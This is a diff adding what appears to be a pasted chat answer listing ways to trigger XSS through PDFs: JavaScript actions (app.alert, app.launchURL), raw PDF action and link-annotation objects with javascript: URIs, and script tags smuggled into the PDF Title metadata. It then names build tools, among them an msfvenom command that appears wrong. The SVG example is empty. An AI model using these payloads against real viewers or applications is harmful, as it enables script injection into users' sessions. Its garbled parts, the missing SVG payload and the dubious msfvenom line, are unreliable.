@@ -1,0 +1,87 @@
+1. Embed JavaScript in PDF (app.launchURL / alert / XSS)
+This runs in Adobe Reader, but can also be rendered in browser PDF viewers depending on the engine.
+
+Payload:
+
+js
+Copy
+Edit
+app.alert("XSS Triggered!");
+Or:
+
+js
+Copy
+Edit
+app.launchURL("javascript:alert('XSS')", true);
+Embedded in raw PDF object:
+
+pdf
+Copy
+Edit
+1 0 obj
+<<
+  /Type /Action
+  /S /JavaScript
+  /JS (app.alert("XSS triggered!"))
+>>
+endobj
+You can embed this with:
+
+pdf-lib
+
+qpdf, mutool, pdf.js
+
+Manually editing with hexedit or notepad++ if raw
+
+2. Trigger XSS via Embedded URL Redirect
+If the app renders the PDF inline, but reflects part of the URL or meta-data (like title, author), you can embed payloads in those fields:
+
+PDF Metadata Injection (Title field):
+
+xml
+Copy
+Edit
+<title"><script>alert(1)</script></title>
+Or in a PDF object:
+
+pdf
+Copy
+Edit
+/Title (<script>alert(1)</script>)
+If the application reflects the PDF title into its DOM, boom — XSS.
+
+3. Using javascript: URLs as Link Annotations
+pdf
+Copy
+Edit
+1 0 obj
+<<
+  /Type /Annot
+  /Subtype /Link
+  /Rect [0 0 100 100]
+  /A <<
+    /S /URI
+    /URI (javascript:alert('XSS'))
+  >>
+>>
+endobj
+This creates a clickable area in the PDF that, if clicked, triggers JavaScript. Might still be parsed if embedded in browser viewers.
+
+4. Embed SVG with XSS (for modern PDF renderers)
+Some modern renderers support embedded SVGs. You can use:
+
+svg
+Copy
+Edit
+
+Insert it into the PDF stream, like via pdf-lib or custom manipulation.
+
+🧰 How to Build or Test This
+Use tools like:
+
+pdf-lib (Node.js or browser)
+
+metasploit's PDF toolkit: msfvenom -p windows/x64/exec -f pdf
+
+pdfid.py, pdf-parser.py — for inspecting and modifying embedded JS
+
